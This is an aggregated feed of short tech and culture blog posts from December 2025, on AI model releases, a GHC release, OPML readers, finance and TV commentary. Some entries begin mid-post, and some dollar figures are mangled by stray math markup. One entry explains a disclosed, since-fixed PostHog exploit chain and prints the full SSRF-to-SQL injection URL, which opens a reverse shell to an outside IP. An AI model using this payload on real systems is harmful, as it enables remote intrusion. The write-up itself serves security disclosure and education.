(date: 2025-12-19)
      <p>
      <p>¿Qué entendemos por “mujer difícil”? Una somera búsqueda en los confines de internet da poca luz a la interrogante. Artículos aficionados, foros de debate, reflexiones sin mucho trasfondo apuntan a acusaciones de falta de control, desacuerdos en opiniones, no ajuste a la regla y negación a pedidos complacientes. ¿Basta esto para catalogar a una mujer […]</p>

      <h4>Revived distro returns on Arch with KDE Plasma, global menus, and a familiar macOS-style sheen</h4>
<p>The new pearOS distro is a Romanian project that picks up the concepts behind the original Pear Linux from 2011 and updates them. It's not going to turn the distro world upside down, but it's fun, interesting, and a showcase for the versatility and customizability of the Linux desktop.</p>

Not exactly sure what it's doing, it appears to show news in reverse chronologic order like a timeline, as <a href="https://news.scripting.com/">in a river</a>. Otherwise Inoreader seems to be a mailbox style reader. Thanks to Randy Lauen for the tip.</p>

      <p>
      <p><img src="https://imgs.scripting.com/2025/11/15/pluribus.png" alt="">You have been warned, spoilers follow...</p>
<p>The whole thing is the book Carol is writing, about writing a book, inside the book she's writing another book. The book I'm speaking of is the one where it's all about Carol.</p>
<p>Everywhere she goes people stop and say hello, and address her by her name.</p>
<ul>
<li>Hi Carol!</li>
<li>Congrats Carol!</li>
<li>Carol, we will move heaven and earth to make you happy.</li>
<li>You suck Carol !!!!</li>
</ul>
<p>In the book she ends up changing them back, un-joining them, and they keep the good qualities they got from being joined, and can be individually creative as they were before the switch.</p>
<p>Also, btw -- <a href="https://en.wikipedia.org/wiki/John_Cena">John Cena</a> says their situation isn't sustainable, but neither is the one we are in now ourselves, in reality, in our reality.</p>
<p>She teaches her lover, Zosia, to think in the first person.</p>
<p>Carol is right about everything because this is her book.</p>
<p>You can see it happening on her whiteboard.</p>
<p>The show could be titled The Adventures of Carol, as told by Carol.</p>
<p><img src="https://imgs.scripting.com/2025/12/19/youSuckCarol.png" alt="">BTW, I might love a podcast of just the writers of the show every week, perhaps interviewed by writers who did not write it, asking questions. It might suck as much as the one they do now, but it also might be great. It would stick to the story, not about praising everyone, kind of like interviews of sports heroes (which are mostly nauseating, except for the few have the gift of gab, who are fun while never saying anything remotely bad about anyone). The people they'd talk about are the people <em>they created.</em></p>

Meaning you get to the list via the web, and the web takes off from there because the whole point of the OPML is to give you a collection of web addresses of feeds, that can change. Machine-readable. And it'll be very useful once there's a little more adoption. What large product is so strong that it won't mind if it's easy to move data into their system from outside their walls? Not just data, but pointers to places were over time there will be more data. There's still more power to explore in the web, but the web is made of people, because until people choose to explore, nothing happens.</p>

<p>Doublespeed, a startup backed by Andreessen Horowitz (a16z) that uses a phone farm to manage at least hundreds of AI-generated social media accounts and promote products has been hacked. The hack reveals what products the AI-generated accounts are promoting, often without the required disclosure that these are advertisements, and allowed the hacker to take control of more than 1,000 smartphones that power the company.</p>
<p>The hacker, who asked for anonymity because he feared retaliation from the company, said he reported the vulnerability to Doublespeed on October 31. At the time of writing, the hacker said he still has access to the company’s backend, including the phone farm itself. ...</p>

      <h1>Introducing GPT-5.2-Codex</h1>

(date: 2025-12-19)
      <p>
      <p><strong><a href="https://openai.com/index/introducing-gpt-5-2-codex/">Introducing GPT-5.2-Codex</a></strong></p>
<p>The latest in OpenAI's <a href="https://simonwillison.net/tags/gpt-codex/">Codex family of models</a> (not the same thing as their Codex CLI or Codex Cloud coding agent tools).</p>
<blockquote>
<p>GPT‑5.2-Codex is a version of <a href="https://openai.com/index/introducing-gpt-5-2/">GPT‑5.2⁠</a> further optimized for agentic coding in Codex, including improvements on long-horizon work through context compaction, stronger performance on large code changes like refactors and migrations, improved performance in Windows environments, and significantly stronger cybersecurity capabilities.</p>
</blockquote>
<p>As with some previous Codex models this one is available via their Codex coding agents now and will be coming to the API &quot;in the coming weeks&quot;. Unlike previous models there's a new invite-only preview process for vetted cybersecurity professionals for &quot;more permissive models&quot;.</p>
<p>I've been very impressed recently with GPT 5.2's ability to <a href="https://simonwillison.net/2025/Dec/15/porting-justhtml/">tackle multi-hour agentic coding challenges</a>. 5.2 Codex scores 64% on the Terminal-Bench 2.0 benchmark that GPT-5.2 scored 62.2% on. I'm not sure how concrete that 1.8% improvement will be!</p>
<p>I didn't hack API access together this time (see <a href="https://simonwillison.net/2025/Nov/9/gpt-5-codex-mini/">previous attempts</a>), instead opting to just ask Codex CLI to &quot;Generate an SVG of a pelican riding a bicycle&quot; while running the new model (effort medium). <a href="https://tools.simonwillison.net/codex-timeline?url=https://gist.githubusercontent.com/simonw/10ad81e82889a97a7d28827e0ea6d768/raw/d749473b37d86d519b4c3fa0892b5e54b5941b38/rollout-2025-12-18T16-09-10-019b33f0-6111-7840-89b0-aedf755a6e10.jsonl#tz=local&amp;q=&amp;type=all&amp;payload=all&amp;role=all&amp;hide=1&amp;truncate=1&amp;sel=3">Here's the transcript</a> in my new Codex CLI timeline viewer, and here's the pelican it drew:</p>
<p><img src="https://static.simonwillison.net/static/2025/5.2-codex-pelican.png" alt="Alt text by GPT-5.2-Codex: A minimalist illustration of a white pelican with a large orange beak riding a teal bicycle across a sandy strip of ground. The pelican leans forward as if pedaling, its wings tucked back and legs reaching toward the pedals. Simple gray motion lines trail behind it, and a pale yellow sun sits in the top‑right against a warm beige sky."></p>

(date: 2025-12-19)
      <p>
      <p><strong><a href="https://agentskills.io/">Agent Skills</a></strong></p>
<p>Anthropic have turned their <a href="https://simonwillison.net/tags/skills/">skills mechanism</a> into an &quot;open standard&quot;, which I guess means it lives in an independent <a href="https://github.com/agentskills/agentskills">agentskills/agentskills</a> GitHub repository now? I wouldn't be surprised to see this end up <a href="https://simonwillison.net/2025/Dec/9/agentic-ai-foundation/">in the AAIF</a>, recently the new home of the MCP specification.</p>
<p>The specification itself lives at <a href="https://agentskills.io/specification">agentskills.io/specification</a>, published from <a href="https://github.com/agentskills/agentskills/blob/main/docs/specification.mdx">docs/specification.mdx</a> in the repo.</p>
<p>It is a deliciously tiny specification - you can read the entire thing in just a few minutes. It's also quite heavily under-specified - for example, there's a <code>metadata</code> field described like this:</p>
<blockquote>
<p>Clients can use this to store additional properties not defined by the Agent Skills spec</p>
<p>We recommend making your key names reasonably unique to avoid accidental conflicts</p>
</blockquote>
<p>And an <code>allowed-skills</code> field:</p>
<blockquote>
<p>Experimental. Support for this field may vary between agent implementations</p>
<p>Example:</p>
<pre><code>allowed-tools: Bash(git:*) Bash(jq:*) Read

</code></pre>
</blockquote>
<p>The Agent Skills homepage promotes adoption by OpenCode, Cursor,Amp, Letta, goose, GitHub, and VS Code. Notably absent is OpenAI, who are <a href="https://simonwillison.net/2025/Dec/12/openai-skills/">quietly tinkering with skills</a> but don't appear to have formally announced their support just yet.</p>

      <p>
      <h1>GHC 9.14.1 is now available</h1>
<h4>zubin - 2025-12-19</h4>
<p>The GHC developers are very pleased to announce the release of GHC 9.14.1.
Binary distributions, source distributions, and documentation are available at<a href="https://downloads.haskell.org/ghc/9.14.1">downloads.haskell.org</a>.</p>
<p>GHC 9.14 brings a number of new features and improvements, including:</p>
<ul>
<li>
<p>Significant improvements in specialisation:</p>
<ul>
<li>The <code>SPECIALISE</code> pragma now allows use of type application syntax</li>
<li>The <code>SPECIALISE</code> pragma can be used to specialise for expression arguments
as well as type arguments.</li>
<li>Specialisation is now considerably more reliable in the presence of<code>newtype</code> s</li>
</ul>
</li>
<li>
<p>Significant GHCi improvements including:</p>
<ul>
<li>Correctness and performance improvements in the bytecode interpreter</li>
<li>Features in the GHCi debugger</li>
<li>Support for multiple home units in GHCi</li>
</ul>
</li>
<li>
<p>Implementation of the <a href="https://github.com/ghc-proposals/ghc-proposals/blob/master/proposals/0682-explicit-level-imports.rst">Explicit Level Imports proposal</a></p>
</li>
<li>
<p><code>RequiredTypeArguments</code> can now be used in more contexts</p>
</li>
<li>
<p>Greatly improved <a href="https://gitlab.haskell.org/ghc/ghc/-/issues/25030">SSE/AVX2 support</a> in the x86 native code generator backend</p>
</li>
<li>
<p>Initial native code generator support for LoongArch</p>
</li>
<li>
<p>The WebAssembly backend now supports <a href="https://www.tweag.io/blog/2025-04-17-wasm-ghci-browser/">evaluation via the interpreter</a>, allowing
GHCi and TemplateHaskell evaluation, including <code>foreign import javascript</code>
usage from within the browser</p>
</li>
<li>
<p>A new primop <a href="https://gitlab.haskell.org/ghc/ghc/-/issues/26218"><code>annotateStack#</code></a> for pushing arbitrary data onto the call stack
for later extraction when decoding stack traces</p>
</li>
<li>
<p><a href="https://github.com/ghc-proposals/ghc-proposals/blob/master/proposals/0516-incomplete-record-selectors.rst"><code>-Wincomplete-record-selectors</code></a> is now part of <code>-Wall</code>. Libraries compiled
with <code>-Werror</code> may need adjustment.</p>
</li>
<li>
<p>A major update of the Windows toolchain</p>
</li>
<li>
<p>Improved compatibility with <a href="https://gitlab.haskell.org/ghc/ghc/-/issues/26166">macOS Tahoe</a></p>
</li>
<li>
<p>… and many more</p>
</li>
</ul>
<p>A full accounting of changes can be found in the <a href="https://downloads.haskell.org/ghc/9.14.1/docs/users_guide/9.14.1-notes.html">release notes</a>.
See the <a href="https://gitlab.haskell.org/ghc/ghc/-/wikis/migration/9.14">migration guide</a> for guidance on migrating programs to this release.</p>
<p>Note that while this release makes many improvements in the specialisation
optimisation, polymorphic specialisation remains disabled by default in the
release due to concern over regressions of the sort identified in<a href="https://gitlab.haskell.org/ghc/ghc/-/issues/26329">#26329</a>. Users needing more aggressive specialisation can explicitly
enable this feature with the <code>-fpolymorphic-specialisation</code> flag. Depending
upon our experience with 9.14.1, we may enable this feature by default in a
later minor release.</p>

      <h4>Even if Mozilla is going to add an AI kill switch, that may not be enough to reassure many.</h4>
<p>Waterfox, a popular fork of Firefox, is saying nay to AI. Considering how unpopular Mozilla's plan to botify its browser has become, this could win the alternative some converts.</p>

      <p>
      <p>Apple: Apple today announced changes impacting iOS apps in Japan to comply with the Mobile Software Competition Act (MSCA). These updates create new options for developers to distribute apps on alternative app marketplaces and to process app payments for digital goods and services outside of Apple In-App Purchase.

      <p>Fatbobman: SwiftData provides a batch deletion API that is more modern and type-safe than its Core Data counterpart. […] Note: Unlike the standard single-object deletion modelContext.delete(_ model: T), batch deletion is only applied to the database after save() is executed.

      <h1>You Might Also Like: My Notes Blog</h1>

(date: 2025-12-18)
      <p>
      <p>If you subscribe to this blog, you must like it — right? I mean, you are subscribed to it.</p>
<p>And if you like this blog, you might also like <a href="https://notes.jim-nielsen.com">my notes blog</a>.</p>
<p>It’s where I take short notes of what I read, watch, listen to, or otherwise consume, add my two cents, and fire it off into the void of the internet.</p>
<p>It’s sort of like a “link blog” but I’m not necessarily recommending everything I link to. It’s more of “This excerpt stood out to me in some way, here’s my thoughts on why.”</p>
<p>It’s nice to have a place where I can jot down a few notes, fire off my reaction, and nobody can respond to it lol. At least, not in any easy, friction-less way. You’d have to go out of your way to read my commentary, find my contact info, and fire off a message (critiquing or praising). That’s how I like it. Cuts through the noise.</p>
<p>Anyway, this is all a long way of saying: if you didn’t already know about my notes blog, you might like it. <a href="https://notes.jim-nielsen.com">Check it out</a> or <a href="https://notes.jim-nielsen.com/feed.xml">subscribe</a>.</p>
<p>Today, for example, I posted lots of grumpy commentary.</p>

      <h3><em>For December 10-16, 2025</em></h3>
<p>Hello and welcome to <strong>A Newsletter of Humorous Writing</strong>, a roundup of the week's finest short humor pieces and funny articles, and a celebration of the fantastic writers who wrote them. This week we’re excited to announce that we’re working on a kids book! It’s a riff on <em>Is Your Mama a Llama?</em> that we’re calling <em>Is Your Vasco da Gama?</em> We can just do that, right?</p>

But what we particularly enjoyed was the turn this piece takes around the halfway mark, when it becomes clear that all of these red/green flags are being experienced by the same person, and a delightfully strange version of a Hallmark movie narrative emerges.</p>

It’s so funny the way the narrator’s tone switches from being disingenuously ingratiating to quietly menacing (and later to being outright threatening):</p>
<p>“Although, you know what… and I just thought of this now, if you can get that subtotal above $75, we’ll just get rid of that shipping cost all together. I mean I’m no mathematician, but that seems like an obvious choice to me! Hahahaha! Here’s some more of our products.</p>

      <h1>Your job is to deliver code you have proven to work</h1>

(date: 2025-12-18)
      <p>
      <p>In all of the debates about the value of AI-assistance in software development there's one depressing anecdote that I keep on seeing: the junior engineer, empowered by some class of LLM tool, who deposits giant, untested PRs on their coworkers - or open source maintainers - and expects the &quot;code review&quot; process to handle the rest.</p>
<p>This is rude, a waste of other people's time, and is honestly a dereliction of duty as a software developer.</p>
<p><strong>Your job is to deliver code you have proven to work.</strong></p>
<p>As software engineers we don't just crank out code - in fact these days you could argue that's what the LLMs are for. We need to deliver <em>code that works</em> - and we need to include <em>proof</em> that it works as well. Not doing that directly shifts the burden of the actual work to whoever is expected to review our code.</p>
<h4>How to prove it works</h4>
<p>There are two steps to proving a piece of code works. Neither is optional.</p>
<p>The first is <strong>manual testing</strong>. If you haven't seen the code do the right thing yourself, that code doesn't work. If it does turn out to work, that's honestly just pure chance.</p>
<p>Manual testing skills are genuine skills that you need to develop. You need to be able to get the system into an initial state that demonstrates your change, then exercise the change, then check and demonstrate that it has the desired effect.</p>
<p>If possible I like to reduce these steps to a sequence of terminal commands which I can paste, along with their output, into a comment in the code review. Here's a <a href="https://github.com/simonw/llm-gemini/issues/116#issuecomment-3666551798">recent example</a>.</p>
<p>Some changes are harder to demonstrate. It's still your job to demonstrate them! Record a screen capture video and add that to the PR. Show your reviewers that the change you made actually works.</p>
<p>Once you've tested the happy path where everything works you can start trying the edge cases. Manual testing is a skill, and finding the things that break is the next level of that skill that helps define a senior engineer.</p>
<p>The second step in proving a change works is <strong>automated testing</strong>. This is so much easier now that we have LLM tooling, which means there's no excuse at all for skipping this step.</p>
<p>Your contribution should <a href="https://simonwillison.net/2022/Oct/29/the-perfect-commit/">bundle the change</a> with an automated test that proves the change works. That test should fail if you revert the implementation.</p>
<p>The process for writing a test mirrors that of manual testing: get the system into an initial known state, exercise the change, assert that it worked correctly. Integrating a test harness to productively facilitate this is another key skill worth investing in.</p>
<p>Don't be tempted to skip the manual test because you think the automated test has you covered already! Almost every time I've done this myself I've quickly regretted it.</p>
<h4>Make your coding agent prove it first</h4>
<p>The most important trend in LLMs in 2025 has been the explosive growth of <strong>coding agents</strong> - tools like Claude Code and Codex CLI that can actively execute the code they are working on to check that it works and further iterate on any problems.</p>
<p>To master these tools you need to learn how to get them to <em>prove their changes work</em> as well.</p>
<p>This looks exactly the same as the process I described above: they need to be able to manually test their changes as they work, and they need to be able to build automated tests that guarantee the change will continue to work in the future.</p>
<p>Since they're robots, automated tests and manual tests are effectively the same thing.</p>
<p>They do feel a little different though. When I'm working on CLI tools I'll usually teach Claude Code how to run them itself so it can do one-off tests, even though the eventual automated tests will use a system like <a href="https://click.palletsprojects.com/en/stable/testing/">Click's CLIRunner</a>.</p>
<p>When working on CSS changes I'll often encourage my coding agent to take screenshots when it needs to check if the change it made had the desired effect.</p>
<p>The good news about automated tests is that coding agents need very little encouragement to write them. If your project has tests already most agents will extend that test suite without you even telling them to do so. They'll also reuse patterns from existing tests, so keeping your test code well organized and populated with patterns you like is a great way to help your agent build testing code to your taste.</p>
<p>Developing good taste in testing code is another of those skills that differentiates a senior engineer.</p>
<h4>The human provides the accountability</h4>
<p><a href="https://simonwillison.net/2025/Feb/3/a-computer-can-never-be-held-accountable/">A computer can never be held accountable</a>. That's your job as the human in the loop.</p>
<p>Almost anyone can prompt an LLM to generate a thousand-line patch and submit it for code review. That's no longer valuable. What's valuable is contributing <em>code that is proven to work</em>.</p>
<p>Next time you submit a PR, make sure you've included your evidence that it works as it should.</p>

      <h1>Pluralistic: A perfect distillation of the social uselessness of finance (18 Dec 2025)</h1>

(date: 2025-12-18)
      <p>
      <p>Today's links A perfect distillation of the social uselessness of finance: A final thought for the yule. Hey look at this: Delights to delectate. Object permanence: Droidflake; Spy Skymall; Malthus is a dope; Happy Public Domain Day 2025. Upcoming appearances: Where to find me. Recent appearances: Where I've been. Latest books: You keep readin' em, I'll keep writin' 'em. Upcoming books: Like I said, I'll keep writin' 'em. Colophon: All the rest. A perfect distillation of the social uselessness of finance (permalink) I'm about to sign off for the year – actually, I was ready to do it yesterday, but then I happened upon a brief piece of writing that was so perfect that I decided I'd do one more edition of Pluralistic for 2025. The piece in question is John Lanchester's &quot;For Every Winner A Loser,&quot; in the London Review of Books, in which Lanchester reviews two books about the finance sector: Gary Stevenson's The Trading Game and Rob Copeland's The Fund: <a href="https://www.lrb.co.uk/the-paper/v46/n17/john-lanchester/for-every-winner-a-loser">https://www.lrb.co.uk/the-paper/v46/n17/john-lanchester/for-every-winner-a-loser</a> It's a long and fascinating piece and it's certainly left me wanting to read both books, but that's not what convinced me to do one more newsletter before going on break – rather, it was a brief passage in the essay's preamble, a passage that perfectly captures the total social uselessness of the finance sector as a whole. Lanchester starts by stating that while we think of the role of the finance sector as &quot;capital allocation&quot; – that is, using investors' money to fund new businesses and expansions for existing business – that hasn't been important to finance for quite some time. Today, only 3% of bank activity consists of &quot;lending to firms and individuals engaged in the production of goods and services.&quot; The other 97% of finance is gambling. Here's how Stevenson breaks it down: say your farm grows mangoes. You need money before the mangoes are harvested, so you sell the future ownership of the harvest to a broker at <span class="math inline">\(1/crate. The broker immediately flips that interest in your harvest to a dealer who believes (on the basis of a rumor about bad weather) that mangoes will be scarce this year and is willing to pay \)</span>1.10/crate. Next, an international speculator (trading on the same rumor) buys the rights from the broker at <span class="math inline">\(1.20/crate. Now come the side bets: a "momentum trader" (who specializing in bets on market trends continuing) buys the rights to your crop for \)</span>1.30/crate. A contrarian trader (who bets against momentum traders) short-sells the momentum trader's bet at <span class="math inline">\(1.20. More short sellers pile in and drive the price down to \)</span>1/crate. Now, a new rumor circulates, about conditions being ripe for a bounteous mango harvest, so more short-sellers appear, and push the price to <span class="math inline">\(0.90/crate. This tempts the original broker back in, and he buys your crop back at \)</span>1/crate. That's when the harvest comes. You bring in the mangoes. They go to market, and fetch <span class="math inline">\(1.10/crate. This is finance – a welter of transactions, only one of which (selling your mangoes to people who eat them) involves the real economy. Everything else is "speculation on the movement of prices." The nine transactions that took place between your planting the crop and someone eating the mangoes are all zero sum – every trade has an evenly matched winner and loser, and when you sum them all up, they come out to zero. In other words, no value was created. This is the finance sector. In a world where the real economy generates \)</span>105 trillion/year, the financial derivatives market adds up to $667 trillion/year. This is &quot;the biggest business in the world&quot; – and it's useless. It produces nothing. It adds no value. If you work a job where you do something useful, you are on the losing side of this economy. All the real money is in this socially useless, no-value-creating, hypertrophied, metastasized finance sector. Every gain in finance is matched by a loss. It all amounts to – literally – nothing. So that's what tempted me into one more blog post for the year – an absolutely perfect distillation of the uselessness of &quot;the biggest business in the world,&quot; whose masters are the degenerate gamblers who buy and sell our politicians, set our policy, and control our lives. They're the ones enshittifying the internet, burning down the planet, and pushing Elon Musk towards trillionairedom. It's their world, and we just live on it. For now.

      <h1>Inoreader and dynamic OPML</h1>

(date: 2025-12-18)
      <p>
      <p><em>This post was updated thanks to <a href="https://github.com/scripting/Scripting-News/issues/348#issuecomment-3672110696">help</a> from Andrew Shell.</em></p>
<p>I have a free account at <a href="https://www.inoreader.com/">Inoreader</a>. I was reminded today that they support dynamic OPML subscription lists, and decided to give it a try.</p>
<p>You can <a href="https://www.inoreader.com/opml_subscriptions">subscribe</a> to an OPML subscription list. Exactly the same format we used for importing lists. This means I can use the same feed list in two readers. Or I could share my list with everyone who subscribes to my newsletter. I can update the list, and the flow of news to the subscribers changes too.</p>
<p>I tried subscribing to my <a href="https://feedland.social/opml?screenname=davewiner&amp;catname=podcasts">podcast list</a> in Inoreader.</p>
<ol>
<li>Put the URL to my podcast list on the clipboard.</li>
<li>Go to <a href="https://www.inoreader.com/opml_subscriptions">this page</a> on the Inoreader site.</li>
<li>Click the big blue Subscribe to OPML button.</li>
<li>Paste the URL from the first step into the dialog.</li>
<li>Enter a folder name and description.</li>
<li>For synchronization I recommend the second option, full synchronization.</li>
<li>Then click Save, and if it worked, you should see the OPML file in a list.</li>
</ol>
<p>It <a href="https://imgs.scripting.com/2025/12/18/inoreaderList.png">worked</a>. I now can see my podcast updates in Inoreader, exactly as if it was in FeedLand.</p>
<p>And when I add new feeds they show up over there, same when I remove.</p>
<p>It'll be very interesting to see how it changes over time. I'll let you know! ;-)</p>
<p><strong>Links</strong></p>

<li><a href="https://this.how/podcasting/">Listening lists</a>, as a feature for podcasts.</li>
<li>This is <a href="https://lists.opml.org/">where</a> I was accumulating short URLs for subscription lists. Started it in Sept. The <a href="https://lists.opml.org/daveblogroll.xml">short URL</a> for the blogroll.</li>

      <h1>Inside PostHog: How SSRF, a ClickHouse SQL Escaping 0day, and Default PostgreSQL Credentials Formed an RCE Chain</h1>

(date: 2025-12-18)
      <p>
      <p><strong><a href="https://mdisec.com/inside-posthog-how-ssrf-a-clickhouse-sql-escaping-0day-and-default-postgresql-credentials-formed-an-rce-chain-zdi-25-099-zdi-25-097-zdi-25-096/">Inside PostHog: How SSRF, a ClickHouse SQL Escaping 0day, and Default PostgreSQL Credentials Formed an RCE Chain</a></strong></p>
<p>Mehmet Ince describes a very elegant chain of attacks against the PostHog analytics platform, combining several different vulnerabilities (now all reported and fixed) to achieve RCE - Remote Code Execution - against an internal PostgreSQL server.</p>
<p>The way in abuses a webhooks system with non-robust URL validation, setting up a SSRF (Server-Side Request Forgery) attack where the server makes a request against an internal network resource.</p>
<p>Here's the URL that gets injected:</p>
<p><code>http://clickhouse:8123/?query=SELECT++FROM+postgresql('db:5432','posthog',\&quot;posthog_use'))+TO+STDOUT;END;DROP+TABLE+IF+EXISTS+cmd_exec;CREATE+TABLE+cmd_exec(cmd_output+text);COPY+cmd_exec+FROM+PROGRAM+$$bash+-c+\\&quot;bash+-i+&gt;%26+/dev/tcp/172.31.221.180/4444+0&gt;%261\\&quot;$$;SELECT++FROM+cmd_exec;+--\&quot;,'posthog','posthog')#</code></p>
<p>Reformatted a little for readability:</p>
<pre><code>http://clickhouse:8123/?query=
SELECT *
FROM postgresql(
    'db:5432',
    'posthog',
    &quot;posthog_use')) TO STDOUT;
    END;
    DROP TABLE IF EXISTS cmd_exec;
    CREATE TABLE cmd_exec (
        cmd_output text
    );
    COPY cmd_exec
    FROM PROGRAM $$
        bash -c \&quot;bash -i &gt;&amp; /dev/tcp/172.31.221.180/4444 0&gt;&amp;1\&quot;
    $$;
    SELECT * FROM cmd_exec;
    --&quot;,
    'posthog',
    'posthog'
)
#

</code></pre>
<p>This abuses ClickHouse's ability to <a href="https://clickhouse.com/docs/sql-reference/table-functions/postgresql#implementation-details">run its own queries against PostgreSQL</a> using the <code>postgresql()</code> table function, combined with an escaping bug in ClickHouse PostgreSQL function ( <a href="https://github.com/ClickHouse/ClickHouse/pull/74144">since fixed</a>). Then <em>that</em> query abuses PostgreSQL's ability to run shell commands via <code>COPY ... FROM PROGRAM</code>.</p>
<p>The <code>bash -c</code> bit is particularly nasty - it opens a reverse shell such that an attacker with a machine at that IP address listening on port 4444 will receive a connection from the PostgreSQL server that can then be used to execute arbitrary commands.</p>

      <h1>The new ChatGPT Images is here</h1>

(date: 2025-12-17)
      <p>
      <p><strong><a href="https://openai.com/index/new-chatgpt-images-is-here/">The new ChatGPT Images is here</a></strong></p>
<p>OpenAI shipped an update to their ChatGPT Images feature - the feature that <a href="https://simonwillison.net/2025/May/13/launching-chatgpt-images/">gained them 100 million new users</a> in a week when they first launched it back in March, but has since been eclipsed by Google's Nano Banana and then further by Nana Banana Pro <a href="https://simonwillison.net/2025/Nov/20/nano-banana-pro/">in November</a>.</p>
<p>The focus for the new ChatGPT Images is speed and instruction following:</p>
<blockquote>
<p>It makes precise edits while keeping details intact, and generates images up to 4x faster</p>
</blockquote>
<p>It's also a little cheaper: OpenAI say that the new <a href="https://platform.openai.com/docs/models/gpt-image-1.5">gpt-image-1.5</a> API model makes image input and output &quot;20% cheaper in GPT Image 1.5 as compared to GPT Image 1&quot;.</p>
<p>I tried a new test prompt against a photo I took of Natalie's ceramic stand at the farmers market a few weeks ago:</p>
<blockquote>
<p>Add two kakapos inspecting the pots</p>
<p><img src="https://static.simonwillison.net/static/2025/pots-q80-half.jpg" alt=""></p>
</blockquote>
<p>Here's the result from the new ChatGPT Images model:</p>
<p><img src="https://static.simonwillison.net/static/2025/pots-chatgpt-q80-half.jpg" alt=""></p>
<p>And here's what I got from Nano Banana Pro:</p>
<p><img src="https://static.simonwillison.net/static/2025/pots-nano-banana-q80-half.jpg" alt=""></p>
<p>The ChatGPT Kākāpō are a little chonkier, which I think counts as a win.</p>
<p>I was a little less impressed by the result I got for an infographic from the prompt &quot;Infographic explaining how the Datasette open source project works&quot; followed by &quot;Run some extensive searches and gather a bunch of relevant information and then try again&quot; ( <a href="https://chatgpt.com/share/6941f249-cbd0-8006-b9ff-5a19167206bc">transcript</a>):</p>
<p><img src="https://static.simonwillison.net/static/2025/chatgpt-infographic.jpg" alt=""></p>
<p>See <a href="https://simonwillison.net/2025/Nov/20/nano-banana-pro/#creating-an-infographic">my Nano Banana Pro post</a> for comparison.</p>
<p>Both models are clearly now usable for text-heavy graphics though, which makes them far more useful than previous generations of this technology.</p>

      <h1>AoAH Day 15: Porting a complete HTML5 parser and browser test suite</h1>

(date: 2025-12-17)
      <p>
      <p><strong><a href="https://anil.recoil.org/notes/aoah-2025-15">AoAH Day 15: Porting a complete HTML5 parser and browser test suite</a></strong></p>
<p>Anil Madhavapeddy is running an <a href="https://anil.recoil.org/notes/aoah-2025">Advent of Agentic Humps</a> this year, building a new useful OCaml library every day for most of December.</p>
<p>Inspired by Emil Stenström's <a href="https://simonwillison.net/2025/Dec/14/justhtml/">JustHTML</a> and my own coding agent <a href="https://simonwillison.net/2025/Dec/15/porting-justhtml/">port of that to JavaScript</a> he coined the term <strong>vibespiling</strong> for AI-powered porting and transpiling of code from one language to another and had a go at building an HTML5 parser in OCaml, resulting in <a href="https://tangled.org/anil.recoil.org/ocaml-html5rw">html5rw</a> which passes the same <a href="https://github.com/html5lib/html5lib-tests">html5lib-tests</a> suite that Emil and myself used for our projects.</p>
<p>Anil's thoughts on the copyright and ethical aspects of this are worth quoting in full:</p>
<blockquote>
<p>The question of copyright and licensing is difficult. I definitely did <em>some</em> editing by hand, and a fair bit of prompting that resulted in targeted code edits, but the vast amount of architectural logic came from JustHTML. So I opted to make the <a href="https://tangled.org/anil.recoil.org/ocaml-html5rw/blob/main/LICENSE.md">LICENSE a joint one</a> with <a href="https://friendlybit.com">Emil Stenström</a>. I did not follow the transitive dependency through to the Rust one, which I probably should.</p>
<p>I'm also extremely uncertain about every releasing this library to the central opam repository, especially as there are <a href="https://github.com/aantron/lambdasoup">excellent HTML5 parsers</a> already available. I haven't checked if those pass the HTML5 test suite, because this is wandering into the agents <em>vs</em> humans territory that I ruled out in my <a href="https://anil.recoil.org/notes/aoah-2025#groundrules-for-the-advent-of-agentic-humps">groundrules</a>. Whether or not this agentic code is better or not is a moot point if releasing it drives away the human maintainers who are the source of creativity in the code!</p>
</blockquote>
<p>I decided to <a href="https://github.com/simonw/justjshtml/commit/106289acee29045cc5afe9732915357063dfc37a">credit Emil in the same way</a> for my own vibespiled project.</p>

      <h1>Gemini 3 Flash</h1>

(date: 2025-12-17)
      <p>
      <p>It continues to be a busy December, if not quite as busy <a href="https://simonwillison.net/2024/Dec/20/december-in-llms-has-been-a-lot/">as last year</a>. Today's big news is <a href="https://blog.google/technology/developers/build-with-gemini-3-flash/">Gemini 3 Flash</a>, the latest in Google's &quot;Flash&quot; line of faster and less expensive models.</p>
<p>Google are emphasizing the comparison between the new Flash and their previous generation's top model Gemini 2.5 Pro:</p>
<blockquote>
<p>Building on 3 Pro’s strong multimodal, coding and agentic features, 3 Flash offers powerful performance at less than a quarter the cost of 3 Pro, along with higher rate limits. The new 3 Flash model surpasses 2.5 Pro across many benchmarks while delivering faster speeds.</p>
</blockquote>
<p>Gemini 3 Flash's characteristics are almost identical to Gemini 3 Pro: it accepts text, image, video, audio, and PDF, outputs only text, handles 1,048,576 maximum input tokens and up to 65,536 output tokens, and has the same knowledge cut-off date of January 2025 (also shared with the Gemini 2.5 series).</p>
<p>The benchmarks look good. The cost is appealing: 1/4 the price of Gemini 3 Pro ≤200k and 1/8 the price of Gemini 3 Pro &gt;200k, and it's nice not to have a price increase for the new Flash at larger token lengths.</p>
<p>It's a little <em>more</em> expensive than previous Flash models - Gemini 2.5 Flash was <span class="math inline">\(0.30/million input tokens and \)</span>2.50/million on output, Gemini 3 Flash is <span class="math inline">\(0.50/million and \)</span>3/million respectively.</p>
<p>Google <a href="https://blog.google/products/gemini/gemini-3-flash/">claim</a> it may still end up cheaper though, due to more efficient output token usage:</p>
<blockquote>
<p>&gt; Gemini 3 Flash is able to modulate how much it thinks. It may think longer for more complex use cases, but it also uses 30% fewer tokens on average than 2.5 Pro.</p>
</blockquote>
<p>Here's <a href="https://www.llm-prices.com/#it=100000&amp;ot=10000&amp;sel=gemini-3-flash-preview%2Cgemini-3-pro-preview%2Cgemini-3-pro-preview-200k%2Cgpt-5.2%2Cclaude-opus-4-5%2Cclaude-sonnet-4.5%2Cclaude-4.5-haiku%2Cgemini-2.5-flash%2Cgpt-5-mini">a more extensive price comparison</a> on my <a href="https://www.llm-prices.com/">llm-prices.com</a> site.</p>
<h4>Generating some SVGs of pelicans</h4>
<p>I released <a href="https://github.com/simonw/llm-gemini/releases/tag/0.28">llm-gemini 0.28</a> this morning with support for the new model. You can try it out like this:</p>
<pre><code>llm install -U llm-gemini
llm keys set gemini # paste in key
llm -m gemini-3-flash-preview &quot;Generate an SVG of a pelican riding a bicycle&quot;

</code></pre>
<p>According to <a href="https://ai.google.dev/gemini-api/docs/gemini-3#thinking_level">the developer docs</a> the new model supports four different thinking level options: <code>minimal</code>, <code>low</code>, <code>medium</code>, and <code>high</code>. This is different from Gemini 3 Pro, which only supported <code>low</code> and <code>high</code>.</p>
